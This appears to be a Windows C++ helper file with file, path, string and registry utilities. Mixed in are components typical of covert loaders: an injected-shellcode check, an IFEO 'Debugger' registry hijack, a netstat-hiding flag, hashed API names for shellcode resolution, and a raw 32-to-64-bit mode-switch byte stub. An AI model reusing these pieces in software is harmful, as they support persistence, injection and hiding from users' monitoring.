#include "Tools.h"
#include <windows.h>
#include <Shlwapi.h>
#include <regex>
#include <stdio.h>


#if 0

	void log(char* str, char* at)
	{
		FILE *pFile = NULL;
		fopen_s(&pFile, "log.txt", "a+");
		if (!pFile)
		{
			printf("log error.......\n");
		}

		char* buf = (char*)malloc(1024);
		if (!buf)
		{
			return;
		}
		strcpy_s(buf, 1024, at);
		strcat_s(buf, 1024, str);
		strcat_s(buf, 1024, "\r\n");
		fwrite(buf, 1, sizeof(buf), pFile);

		//std::string temp;
		//temp.assign(at);
		////temp.assign(buf);
		//temp.append(str);
		//temp.append("\r\n");
		//if (!temp.empty())
		//{
		//	fwrite(temp.c_str(), 1, temp.size(), pFile);
		//}

		fclose(pFile);
	}
#endif


// void log(std::string str, char* at)
// 	{
// 		std::ofstream ofs("log.txt", std::ios::app);
// 		if (at)
// 		{
// 			ofs << at;
// 		}
// 		if (!str.empty())
// 		{
// 			ofs << str.c_str() << "\r\n";
// 		}
// 		ofs.close();
// 	}

void OutputA(const char * strOutputString, ...)
{
	char strBuffer[4096] = { 0 };
	va_list vlArgs;
	va_start(vlArgs, strOutputString);
	_vsnprintf_s(strBuffer, sizeof(strBuffer)-1, strOutputString, vlArgs);
	va_end(vlArgs);
	OutputDebugStringA(strBuffer);
}
void OutputW(const wchar_t * strOutputString, ...)
{
	wchar_t strBuffer[4096] = { 0 };
	va_list vlArgs;
	va_start(vlArgs, strOutputString);
	_vsnwprintf_s(strBuffer, sizeof(strBuffer)-1, strOutputString, vlArgs);
	va_end(vlArgs);
	OutputDebugStringW(strBuffer);
}

bool IsLoadByShellcode()
{
	MEMORY_BASIC_INFORMATION memInfo;
	if (VirtualQueryEx(GetCurrentProcess(), (LPVOID)&IsLoadByShellcode, &memInfo, sizeof(memInfo))){
		if (memInfo.Type == MEM_IMAGE)
			return false;
	}
	return true;
}
void ByteAlign(std::string& strOutShellCode)
{
	size_t len = strOutShellCode.size();
	size_t lenAdd = 8 - len % 8;
	if (lenAdd > 0){
		std::string strAddData;
		strAddData.assign(lenAdd, '\0');
		strOutShellCode += strAddData;
	}
}
bool ReadBinFile(const std::string& strFile, std::string& strData)
{
// 	log("Entry ReadBinFile", AT);

	std::ifstream ifile(strFile, std::ifstream::binary);
	if (!ifile.is_open())
		return false;
	ifile.seekg(0, ifile.end);
	std::streamoff len = ifile.tellg();
	ifile.seekg(0, ifile.beg);
	strData.clear();
	strData.reserve((int)len);
	strData.assign(std::istreambuf_iterator<char>(ifile), std::istreambuf_iterator<char>());
	ifile.close();
	return (len == strData.size());
}
bool WriteBinFile(const std::string& strFile, std::string& strData){
	std::ofstream ofile(strFile, std::ifstream::binary);
	if (!ofile.is_open())
		return false;
	ofile.write(strData.data(), strData.size());
	std::streamoff len = ofile.tellp();
	ofile.close();
	return (len == strData.size());
}
std::wstring GetAppPathW()//���з�б��
{
	std::wstring strAppPath; // ������
	WCHAR szModuleFileName[MAX_PATH]; // ȫ·����
	WCHAR drive[_MAX_DRIVE]; // �̷�����
	WCHAR dir[_MAX_DIR]; // Ŀ¼
	WCHAR fname[_MAX_FNAME]; // ��������
	WCHAR ext[_MAX_EXT]; //��׺��һ��Ϊexe������dll
	if (NULL == GetModuleFileNameW(NULL, szModuleFileName, MAX_PATH)) //��õ�ǰ���̵��ļ�·��
		return L"";
	_wsplitpath_s(szModuleFileName, drive, dir, fname, ext); //�ָ��·�����õ��̷���Ŀ¼���ļ�������׺��
	strAppPath = drive;
	strAppPath += dir;
	return strAppPath;
}
std::string GetAppPathA(){
	char cache_buf[_MAX_PATH];
	std::wstring conv_path = GetAppPathW();
	WideCharToMultiByte(CP_ACP, WC_COMPOSITECHECK, conv_path.c_str(), -1, cache_buf, sizeof(cache_buf), NULL, NULL);
	std::string result = cache_buf;
	return result;
}
std::wstring GetAppPathNameW()//���з�б��
{
	WCHAR szModuleFileName[MAX_PATH]; // ȫ·����
	if (NULL == GetModuleFileNameW(NULL, szModuleFileName, MAX_PATH)) //��õ�ǰ���̵��ļ�·��
		return L"";
	return szModuleFileName;
}
std::string GetAppPathNameA(){
	char cache_buf[_MAX_PATH];
	std::wstring conv_path = GetAppPathNameW();
	WideCharToMultiByte(CP_ACP, WC_COMPOSITECHECK, conv_path.c_str(), -1, cache_buf, sizeof(cache_buf), NULL, NULL);
	std::string result = cache_buf;
	return result;
}
std::map<std::string, std::string> ParsePathFileA(const char* szPathFile){
	char drive[_MAX_DRIVE] = { 0 };
	char dir[_MAX_DIR] = { 0 };
	char fname[_MAX_FNAME] = { 0 };
	char ext[_MAX_EXT] = { 0 };
	_splitpath_s(szPathFile, drive, sizeof(drive) / sizeof(char),
		dir, sizeof(dir) / sizeof(char), fname, sizeof(fname) / sizeof(char),
		ext, sizeof(ext) / sizeof(char));

	std::map<std::string, std::string> mapPath;
	mapPath["drive"] = drive;
	mapPath["dir"] = dir;
	mapPath["fname"] = fname;
	mapPath["ext"] = ext;
	return mapPath;
}
std::map<std::string, std::string> ParsePathFileA(const std::string& strPathFile){
	return ParsePathFileA(strPathFile.c_str());
}
std::string BuildPathFileA(std::map<std::string, std::string>& mapPathFile){
	//mapPathFile.count("drive");
	std::string strPathFile;
	strPathFile = mapPathFile["drive"] + "\\";
	if (1 == mapPathFile.count("dir"))
		strPathFile += mapPathFile["dir"]+ "\\";
	strPathFile += mapPathFile["fname"] + mapPathFile["ext"];

	return strPathFile;
}
bool RegSet(unsigned long hPreKey, const std::wstring& strSubPath, const std::wstring& strName, const std::wstring& strValue)
{
// 	log("Entry RegSet Do IFEO", AT);

	bool bRet = false;
	HKEY hKey = 0;
	DWORD state = 0;     //   RegCreateKeyExW ����������
	if (ERROR_SUCCESS == RegCreateKeyExW((HKEY)hPreKey, strSubPath.c_str(), 0, 0, 0, KEY_QUERY_VALUE | KEY_SET_VALUE, 0, &hKey, &state))
	{
		if (ERROR_SUCCESS == RegSetValueExW(hKey, strName.c_str(), 0, REG_SZ, (BYTE*)strValue.c_str(), (DWORD)strValue.size() * 2)){
			bRet = true;
		}
		RegCloseKey(hKey);
	}
	return bRet;
}
bool RegGet(unsigned long hPreKey, const std::wstring& strSubPath, const std::wstring& strName, std::wstring& strValue)
{
	bool bRet = false;
	HKEY hKey = 0;
	DWORD state = 0;
	if (ERROR_SUCCESS == RegCreateKeyExW((HKEY)hPreKey, strSubPath.c_str(), 0, 0, 0, KEY_QUERY_VALUE | KEY_SET_VALUE, 0, &hKey, &state))
	{
		DWORD uType = 0;
		DWORD uSize = 0;
		if (ERROR_SUCCESS == RegQueryValueExW(hKey, strName.c_str(), NULL, NULL, NULL, &uSize)){
			strValue.reserve(uSize / sizeof(wchar_t));
			strValue.assign(uSize / sizeof(wchar_t), L'\0');
			if (ERROR_SUCCESS == RegQueryValueExW(hKey, strName.c_str(), 0, &uType, (BYTE*)strValue.data(), &uSize)){
				bRet = true;
			}
		}
		RegCloseKey(hKey);
	}
	return bRet;
}
std::wstring GetAppNameW()
{
	std::wstring strAppName; // ������
	WCHAR szModuleFileName[MAX_PATH]; // ȫ·����
	WCHAR drive[_MAX_DRIVE]; // �̷�����
	WCHAR dir[_MAX_DIR]; // Ŀ¼
	WCHAR fname[_MAX_FNAME]; // ��������
	WCHAR ext[_MAX_EXT]; //��׺��һ��Ϊexe������dll
	if (NULL == GetModuleFileNameW(NULL, szModuleFileName, MAX_PATH)) //��õ�ǰ���̵��ļ�·��
		return L"";
	_wsplitpath_s(szModuleFileName, drive, dir, fname, ext); //�ָ��·�����õ��̷���Ŀ¼���ļ�������׺��
	strAppName = fname;
	strAppName += ext;
	return strAppName;
}
std::string GetAppNameA(){
	char cache_buf[_MAX_PATH];
	std::wstring conv_path = GetAppNameW();
	WideCharToMultiByte(CP_ACP, WC_COMPOSITECHECK, conv_path.c_str(), -1, cache_buf, sizeof(cache_buf), NULL, NULL);
	std::string result = cache_buf;
	return result;
}
wchar_t* ToolAscII2WideString(const char* pInput)
{
	PWCHAR	pWideString = NULL;
	int	dwNeedSize = 0;

	dwNeedSize = MultiByteToWideChar(CP_ACP, 0, (LPCSTR)pInput, (int)strlen(pInput), NULL, 0);
	pWideString = (PWCHAR)new char[2 * dwNeedSize + 2];
	memset(pWideString, 0, 2 * dwNeedSize + 2);
	if (!pWideString)
	{
		return L"";
	}
	MultiByteToWideChar(CP_ACP, 0, (LPCSTR)pInput, (int)strlen(pInput), pWideString, dwNeedSize);
	return pWideString;
}
char* ToolWideString2AscIIString(const wchar_t* pUnicode)
{
	PCHAR pAscString = NULL;
	int	dwNeedSize = 0;

	dwNeedSize = WideCharToMultiByte(CP_ACP, 0, pUnicode, (int)wcslen(pUnicode), NULL, 0, NULL, NULL);
	pAscString = (PCHAR)new char[dwNeedSize + 2];
	memset(pAscString, 0, dwNeedSize + 2);
	if (!pAscString)
	{
		return "";
	}
	WideCharToMultiByte(CP_ACP, 0, pUnicode, (int)wcslen(pUnicode), pAscString, dwNeedSize, NULL, NULL);
	return pAscString;
}
std::string _w2a(const std::wstring& strw){
	const char* pStrA = ToolWideString2AscIIString(strw.c_str());
	std::string strA = pStrA;
	delete pStrA;
	return strA;
}
std::string _w2a(const wchar_t* szStrw){
	const char* pStrA = ToolWideString2AscIIString(szStrw);
	std::string strA = pStrA;
	delete pStrA;
	return strA;
}
std::wstring _a2w(const std::string& stra){
	const wchar_t* pStrW = ToolAscII2WideString(stra.c_str());
	std::wstring strW = pStrW;
	delete pStrW;
	return strW;
}
std::wstring _a2w(const char* szStra){
	const wchar_t* pStrW = ToolAscII2WideString(szStra);
	std::wstring strW = pStrW;
	delete pStrW;
	return strW;
}

BOOL RegDeleteNosafe(unsigned long hPreKey, const std::wstring& strName)
{
	BOOL bRet = FALSE;
	HKEY hKey;
	DWORD count;
	if (RegOpenKeyExW((HKEY)hPreKey, strName.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
	{
		bRet = RegDeleteValueA(hKey, "Debugger");
	//	bRet = RegDeleteValueA(hKey, "(Ĭ��)");
		//bRet = RegDeleteKeyExW(hKey, strName.c_str(), KEY_ALL_ACCESS, NULL);
	}
	return bRet;
}


//-------------------------------
int setHideFlagInNetstat()
{
	char szNameTest[9] = { 'F', 'i', 'l', 'e', 'M', 'a', 'p', 'x', '\0' };
	char szNum11[11] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '\0' };
	for (int i = 0; i < 10; i++)
	{
		szNameTest[7] = szNum11[i];
		HANDLE hMapFile = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, szNameTest);
		if (!hMapFile)
			break;
		CloseHandle(hMapFile);// mustbe
	}
	HANDLE hMapFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 1024, szNameTest);
	if (hMapFile){
		LPBYTE lpMapAddr = (LPBYTE)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
		if (lpMapAddr){
			*(DWORD*)lpMapAddr = GetCurrentProcessId();
			FlushViewOfFile(lpMapAddr, sizeof(DWORD));
			//UnmapViewOfFile(lpMapAddr); // process terminal  auto del
		}
		//CloseHandle(hMapFile);// process terminal  auto del
	}
	// jump  real entry point 

	return 0;
}
void setContainerFlag()
{
	char szContainerFlag[] = "ContainerFlag";
	HANDLE hMapFile = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, szContainerFlag);
	if (hMapFile){
		CloseHandle(hMapFile);
		return;
	}
	hMapFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 1024, szContainerFlag);
	if (hMapFile){
		LPBYTE lpMapAddr = (LPBYTE)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
		if (lpMapAddr){
			*(DWORD*)lpMapAddr = GetCurrentProcessId();
			FlushViewOfFile(lpMapAddr, sizeof(DWORD));
			//UnmapViewOfFile(lpMapAddr); // process terminal  auto del
		}
		//CloseHandle(hMapFile);// process terminal  auto del
	}
	return;
}
void setRealWorkRunFlag()
{
	DWORD dwPid = GetCurrentProcessId();
	std::string strRealWorkRunFlag = "RealWorkRunFlag_";
	strRealWorkRunFlag += std::to_string(dwPid);
	HANDLE hMapFile = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, strRealWorkRunFlag.c_str());
	if (hMapFile){
		CloseHandle(hMapFile);
		return;
	}
	hMapFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 1024, strRealWorkRunFlag.c_str());
	if (hMapFile){
		LPBYTE lpMapAddr = (LPBYTE)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
		if (lpMapAddr){
			*(DWORD*)lpMapAddr = GetCurrentProcessId();
			FlushViewOfFile(lpMapAddr, sizeof(DWORD));
			//UnmapViewOfFile(lpMapAddr); // process terminal  auto del
		}
		//CloseHandle(hMapFile);// process terminal  auto del
	}
	return;
}
bool testRealWorkRunFlag(DWORD dwPid)
{
	bool bTest = false;
	std::string strRealWorkRunFlag = "RealWorkRunFlag_";
	strRealWorkRunFlag += std::to_string(dwPid);
	HANDLE hMapFile = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, strRealWorkRunFlag.c_str());
	if (hMapFile){
		LPBYTE lpMapAddr = (LPBYTE)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
		if (lpMapAddr){
			//dwPid = *(DWORD*)lpMapAddr;
			bTest = true;
			UnmapViewOfFile(lpMapAddr); // mustbe
		}
		CloseHandle(hMapFile); // mustbe
	}
	return bTest;
}
std::vector<std::string> splitstr(std::string str, std::string s)
{
	std::regex reg(s.c_str());
	std::vector<std::string> vec;
	std::sregex_token_iterator it(str.begin(), str.end(), reg, -1);
	std::sregex_token_iterator end;
	while (it != end)
	{
		vec.push_back(*it++);
	}
	return vec;
}

std::vector<std::wstring> splitwstr(std::wstring str, std::wstring s)
{
	std::wregex reg(s.c_str());
	std::vector<std::wstring> vec;
	std::wsregex_token_iterator it(str.begin(), str.end(), reg, -1);
	std::wsregex_token_iterator end;
	while (it != end)
	{
		vec.push_back(*it++);
	}
	return vec;
}

// void GetIniSecMapW(const wchar_t* file, const wchar_t* sec, std::map<std::wstring, std::wstring>& mapSec,bool bLwr){
// 	
// 	log("Entry hook_explorer => Init => GetIniSecMapW", AT);
// 	bool bInitOk = true;
// 	if (PathFileExistsW(file))
// 	{
// 		WCHAR keyBuff[4096];//  too small
// 		memset(keyBuff, 0, sizeof(keyBuff));
// 		DWORD dwResultSec = GetPrivateProfileStringW(sec, 0, L"", keyBuff, sizeof(keyBuff), file);
// 		if (dwResultSec)
// 		{
// 			for (size_t j = 0; j < sizeof(keyBuff); j++)
// 			{
// 				if (keyBuff[j])
// 				{
// 					WCHAR valBuff[1024];
// 					memset(valBuff, 0, sizeof(valBuff));
// 					DWORD dwResultVal = GetPrivateProfileStringW(sec, &keyBuff[j], L"", valBuff, sizeof(valBuff), file);
// 					if (dwResultVal)
// 					{
// 						if (bLwr){
// 							_wcslwr_s(&keyBuff[j], 4096);
// 							_wcslwr_s(valBuff, 1024);
// 						}
// 						mapSec[&keyBuff[j]] = valBuff;
// 					}
// 					else{
// 						bInitOk = false;
// 						break;//err
// 					}
// 				}
// 				else break;
// 				size_t lenKayName = wcslen(&keyBuff[j]);
// 				j = j + lenKayName;
// 			}
// 		}
// 		else
// 		{
// 			bInitOk = false;
// 		}
// 	}
// 	else
// 		bInitOk = false;
// }



DWORD GetRolHash(char *lpszBuffer)
{
	DWORD dwHash = 0;
	while (*lpszBuffer)
	{
		dwHash = ((dwHash << 25) | (dwHash >> 7));
		dwHash = dwHash + *lpszBuffer;
		lpszBuffer++;
	}
	return dwHash;
}

void GetFuncHash()
{
	const int iFuncNum = 4;
	char szFunc[iFuncNum][15] = {
		{ 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0' },
		{ 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0' },
		{ 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', '\0' },
		{ 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', '\0' },
	};
	DWORD dwFuncNameHash[iFuncNum] = { 0 };
	for (int i = 0; i < iFuncNum; i++)
	{
		dwFuncNameHash[i] = GetRolHash(szFunc[i]);
	}
	return;
}










//   maybe useful EndOfAllocation





//DebugBreak();
// 	std::regex reg("<a[^0-9]+param=(\\d{5,20})[^0-9]+?>", std::regex::ECMAScript);
// 	std::string strResponseExtId = std::regex_replace("xxxxx", reg, std::string("($1)"));
// 	std::string s("subject");
// 	std::regex e("(sub)(.*)");
// 
// 	if (std::regex_match(s, e))
// 		std::cout << "string object matched\n";
// 	return 0;




// #pragma data_seg(".test")
// #pragma data_seg()
// __declspec(allocate(".test"))

char instbyte[] =
"\x55\x89\xE5\x56\x57\x8B\x75\x08\x8B\x4D\x0C\xE8\x00\x00\x00\x00"
"\x58\x83\xC0\x25\x83\xEC\x08\x89\xE2\xC7\x42\x04\x33\x00\x00\x00"
"\x89\x02\xE8\x09\x00\x00\x00\x83\xC4\x14\x5F\x5E\x5D\xC2\x08\x00"
"\x8B\x3C\x24\xFF\x2A\x48\x31\xC0\x57\xFF\xD6\x5F\x50\xC7\x44\x24"
"\x04\x23\x00\x00\x00\x89\x3C\x24\xFF\x2C\x24";

// #pragma section (".code",execute,read,write)
// #pragma comment (linker,"/MERGE:.text=.code")
// #pragma comment (linker,"/merge:.data=.code")
// #pragma code_seg(".code")

// --

void* ReadLibrary(long *pSize, char* fileName) {
	long read;
	void* result;
	FILE* fp;

	fp = fopen(fileName, "rb");
	if (fp == NULL)
	{
		//printf(_T("Can't open DLL file \"%s\"."), fileName);
		return NULL;
	}

	fseek(fp, 0, SEEK_END);
	*pSize = ftell(fp);
	if (*pSize < 0)
	{
		fclose(fp);
		return NULL;
	}

	result = (unsigned char *)malloc(*pSize);
	if (result == NULL)
	{
		return NULL;
	}

	fseek(fp, 0, SEEK_SET);
	read = fread(result, 1, *pSize, fp);
	fclose(fp);
	if (read != static_cast<size_t>(*pSize))
	{
		free(result);
		return NULL;
	}

	return result;
}
bool WriteFileOver(char* pBuf, long size, char* fileName) {
	long read;
	FILE* fp;

	fp = fopen(fileName, "wb");
	if (fp == false)
	{
		//printf("Can't open file \"%s\".", fileName);
		return false;
	}

	fseek(fp, 0, SEEK_SET);
	//long old_size = ftell(fp);
	long write_size = fwrite(pBuf, sizeof(char), sizeof(char)*size, fp);
	//long old_size = ftell(fp);
	fclose(fp);
	if (write_size != static_cast<size_t>(size))
	{
		return false;
	}

	return true;
}
bool WriteFileAdd(char* pBuf, long size, char* fileName) {
	long read;
	FILE* fp;

	fp = fopen(fileName, "a+");
	if (fp == false)
	{
		//printf(_T("Can't open file \"%s\"."), fileName);
		return false;
	}

	fseek(fp, 0, SEEK_END);
	//long old_size = ftell(fp);
	long write_size = fwrite(pBuf, sizeof(char), sizeof(char)*size, fp);
	//long old_size = ftell(fp);
	fclose(fp);
	if (write_size != static_cast<size_t>(size))
	{
		return false;
	}

	return true;
}
void* File2Buffer(long* pSize, const char* strPath)
{
	HANDLE hFile = ::CreateFileA(strPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD nFileSize = ::GetFileSize(hFile, NULL);
		char* lpBuffer = (char *)LocalAlloc(LPTR, nFileSize);
		DWORD nNumberOfBytesRead;
		BOOL bRet = ::ReadFile(hFile, lpBuffer, nFileSize, &nNumberOfBytesRead, NULL);// use a loop ?
		if (nFileSize != nNumberOfBytesRead){
			DebugBreak();
			return 0;
		}
		*pSize = nFileSize;
		CloseHandle(hFile);
		return lpBuffer;
	}
	return 0;
}
